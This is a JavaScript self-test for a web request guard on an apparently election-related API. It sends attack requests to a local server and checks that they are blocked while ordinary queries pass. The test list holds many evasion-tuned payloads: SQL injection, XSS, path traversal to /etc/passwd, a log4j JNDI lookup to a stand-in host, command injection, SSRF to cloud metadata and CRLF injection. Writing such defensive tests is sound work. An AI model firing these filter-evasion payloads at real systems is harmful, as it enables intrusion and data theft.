// Guard layer self-test: attack requests that MUST be caught and clean
// requests that must NOT be blocked. Run against a LOCAL worker only:
//
//   npx wrangler dev --local          (in another terminal)
//   npm run test:guard                (or: node tests/guard-selftest.mjs http://localhost:8787)
//
// Never point this at the live API: attack tests earn ban strikes and fill the
// security log. Each request gets its own user agent so one test's ban can't
// make another look "caught" (bans are keyed by IP + user agent).

const BASE = process.argv[2] || "http://127.0.0.1:8787";
const CHROME =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

// [name, path, extra headers, user agent]
const ATTACKS = [
  ["plain UNION SELECT", "/candidates?q=1%20union%20select%201"],
  ["<script> in URL", "/candidates?q=%3Cscript%3Ealert(1)%3C/script%3E"],
  ["../ traversal", "/candidates?f=../../etc/passwd"],
  ["/.env probe", "/.env"],
  ["sqlmap user agent", "/election/status", null, "sqlmap/1.8#stable"],
  ["full-width UNION SELECT", "/candidates?q=1%20%EF%BC%B5%EF%BC%AE%EF%BC%A9%EF%BC%AF%EF%BC%AE%20%EF%BC%B3%EF%BC%A5%EF%BC%AC%EF%BC%A5%EF%BC%A3%EF%BC%B4%201"],
  ["no-break space union select", "/candidates?q=1%20union%C2%A0select%201"],
  ["HTML-entity javascript: (no alert)", "/candidates?u=jav%26%23x61%3Bscript%26colon%3Bvoid(0)"],
  ["<img onerror=", "/candidates?x=%3Cimg%20src%3Dx%20onerror%3Dprompt(1)%3E"],
  ["\\u003cscript escape (no alert)", "/candidates?x=%5Cu003cscript%5Cu003e"],
  ["MySQL comment /*!50000UNION*/", "/candidates?q=1%20/*!50000UNION*/%20/*!50000SELECT*/%201"],
  ["comment inside keyword UN/**/ION", "/candidates?q=1%20UN/**/ION%20SEL/**/ECT%201"],
  ["1 AND 2>1", "/candidates?id=1%20AND%202%3E1"],
  ["union(select", "/candidates?q=1%20union(select%201)"],
  ["split params a=union & a=select", "/candidates?a=1%20union&a=select%201"],
  ["triple-encoded ../", "/candidates?f=%25252e%25252e%25252fetc%25252fpasswd"],
  ["SQLi in Cookie", "/election/status", { Cookie: "session=1' OR '1'='1" }],
  ["SQLi in a cookie NAME", "/election/status", { Cookie: "1' or '1'='1=x" }],
  ["XSS in Referer", "/election/status", { Referer: "https://x.example/<script>alert(1)</script>" }],
  ["SQLi in X-Forwarded-For", "/election/status", { "X-Forwarded-For": "1.2.3.4' union select 1--" }],
  ["log4j ${jndi:} in a header", "/election/status", { "X-Api-Version": "${jndi:ldap://x.example/a}" }],
  ["probe /laravel.log", "/storage/logs/laravel.log"],
  ["probe /composer.json", "/composer.json"],
  ["probe /.DS_Store", "/.DS_Store"],
  ["probe /server-status", "/server-status"],
  ["probe /actuator/env", "/actuator/env"],
  ["probe /web.config", "/web.config"],
  ["probe /phpinfo.php", "/phpinfo.php"],
  // found by fuzzing / hard tests (17 Nov)
  ["overlong UTF-8 ../", "/candidates?f=%c0%ae%c0%ae%c0%afetc%c0%afpasswd"],
  ["IIS %u ../", "/candidates?f=%u002e%u002e%u002fetc%u002fpasswd"],
  ["C:\windows\win.ini", "/candidates?f=C:%5Cwindows%5Cwin.ini"],
  ["<details ontoggle>", "/candidates?x=%3Cdetails%20open%20ontoggle%3Dprint()%3E"],
  ["<x onpointerenter>", "/candidates?x=%3Cx%20onpointerenter%3Dprint()%3Ehi"],
  ["java<TAB>script:", "/candidates?u=java%09script:print()"],
  ["{{constructor.constructor}}", "/candidates?q=%7B%7Bconstructor.constructor('x')()%7D%7D"],
  ["sqlite_master", "/candidates?q=1%20and%20(select%20name%20from%20sqlite_master)"],
  ["@@version", "/candidates?q=1%20and%20@@version"],
  ["waitfor delay", "/candidates?q=1;waitfor%20delay%20'0:0:5'"],
  ["pg_sleep", "/candidates?q=1%20and%20pg_sleep(5)"],
  ["admin'--", "/candidates?q=admin'--"],
  ["' or 'a' like 'a", "/candidates?q='%20or%20'a'%20like%20'a"],
  ["&& whoami", "/candidates?c=1%20%26%26%20whoami"],
  ["newline id", "/candidates?c=1%0aid"],
  ["__proto__", "/candidates?__proto__[isAdmin]=1"],
  ["SSRF metadata", "/candidates?url=http://169.254.169.254/latest/meta-data"],
  ["CRLF header injection", "/candidates?x=%0d%0aSet-Cookie:%20a=b"],
  ["zero-width inside SELECT", "/candidates?q=1%20union%20sel%E2%80%8Bect%201"],
  ["entity inside percent-code", "/candidates?q=1%20union%20%26%23115;elect%201"],
  ["full-width percent", "/candidates?q=1%EF%BC%8520union%EF%BC%8520select%201"],
  ["probe sent as OPTIONS", "/.env", null, null, "OPTIONS"],
];

const CLEAN = [
  ["status check", "/election/status"],
  ["candidates list", "/candidates"],
  ["'The union selected a new chairman'", "/candidates?q=The%20union%20selected%20a%20new%20chairman"],
  ["'Tom & Jerry'", "/candidates?q=Tom%20%26%20Jerry"],
  ["'5 and 6'", "/candidates?q=5%20and%206"],
  ["'select your candidate'", "/candidates?q=select%20your%20candidate"],
  ["'R&D' and 'AT&T'", "/candidates?q=R%26D%20AT%26T"],
  ["Chrome with Sec-CH-UA", "/election/status", { "Sec-CH-UA": '"Chromium";v="131", "Not_A Brand";v="24"', "Sec-CH-UA-Mobile": "?1" }],
  ["Firefox", "/election/status", null, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"],
  ["Edge", "/election/status", null, `${CHROME} Edg/131.0.0.0`],
  ["Instagram in-app browser", "/election/status", null, "Mozilla/5.0 (Linux; Android 13; TECNO KI5k) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0 Mobile Safari/537.36 Instagram 309.0.0.40.113 Android"],
  ["Facebook in-app browser", "/election/status", null, "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/440.0.0.33.116]"],
  ["WhatsApp link preview", "/election/status", null, "WhatsApp/2.23.20.0 A"],
  ["Opera Mini on a cheap Android", "/election/status", null, "Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; en) Presto/2.12.423 Version/12.16"],
  ["common cookies (_ga, PHPSESSID, __cf_bm)", "/election/status", { Cookie: "_ga=GA1.1.123.456; PHPSESSID=abc123; __cf_bm=Xy.9-z_AbC=-1.0.1.1-QwE" }],
  ["Referer from our own site", "/election/status", { Referer: "https://nuesaabuad.ng/elections" }],
  ["mail image URL", "/mail/images/0123456789abcdef"],
  ["blog posts", "/blog/posts"],
  ["query ?id=5", "/candidates?id=5"],
  ["Referer with ?a=1&id=2", "/election/status", { Referer: "https://nuesaabuad.ng/elections?a=1&id=2&cat=3" }],
  ["'cat pictures'", "/candidates?q=cat%20pictures"],
  ["'order by price'", "/candidates?q=order%20by%20price"],
  ["'version 2 (beta)'", "/candidates?q=version%202%20(beta)"],
  ["'O'Brien'", "/candidates?q=O'Brien"],
  ["CORS preflight on a real route", "/vote", { "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "content-type,authorization" }, null, "OPTIONS"],
  ["voter sign-in POST (JSON body)", "/voter/verify", { "Content-Type": "application/json" }, null, "POST", JSON.stringify({ matricNumber: "22/SCI01/020", invoiceNumber: "668863" })],
];

let n = 0;
async function send(path, headers, ua, method = "GET", body) {
  n += 1;
  const res = await fetch(BASE + path, {
    method,
    body,
    headers: { "User-Agent": `${ua || CHROME} selftest-${n}-${Math.random().toString(36).slice(2, 8)}`, ...(headers || {}) },
  });
  return { status: res.status, text: (await res.text()).slice(0, 200) };
}

const missed = [];
console.log("=== ATTACKS (must be caught) ===");
for (const [name, path, headers, ua, method] of ATTACKS) {
  const { status, text } = await send(path, headers, ua, method);
  const caught = status === 403 && (text.includes("Request blocked") || text.includes("temporarily blocked"));
  if (!caught) missed.push(name);
  console.log(`${caught ? "CAUGHT " : "MISSED "} ${name.padEnd(40)} ${status}`);
}

const blocked = [];
console.log("\n=== CLEAN (must NOT be blocked) ===");
for (const [name, path, headers, ua, method, body] of CLEAN) {
  const { status, text } = await send(path, headers, ua, method, body);
  // Only the guard's own refusal counts; e.g. "voting is not open" is a normal 403.
  const isBlocked = status === 403 && (text.includes("Request blocked") || text.includes("temporarily blocked"));
  if (isBlocked) blocked.push(name);
  console.log(`${isBlocked ? "BLOCKED" : "OK     "} ${name.padEnd(40)} ${status}`);
}

console.log(`\nAttacks caught: ${ATTACKS.length - missed.length}/${ATTACKS.length}`);
console.log(`Clean requests wrongly blocked: ${blocked.length}/${CLEAN.length}`);
if (missed.length) console.log("MISSED:", missed.join("; "));
if (blocked.length) console.log("WRONGLY BLOCKED:", blocked.join("; "));
process.exit(missed.length || blocked.length ? 1 : 0);
